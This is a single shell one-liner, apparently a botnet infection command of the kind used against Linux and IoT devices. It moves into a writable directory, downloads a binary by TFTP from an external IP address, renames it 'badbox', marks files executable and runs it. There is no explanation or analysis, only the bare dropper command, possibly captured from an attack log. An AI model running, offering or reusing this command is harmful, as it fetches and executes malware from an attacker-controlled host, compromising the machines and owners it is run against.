cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 185.175.208.19;cat telnetd >badbox;chmod +x *;./badbox
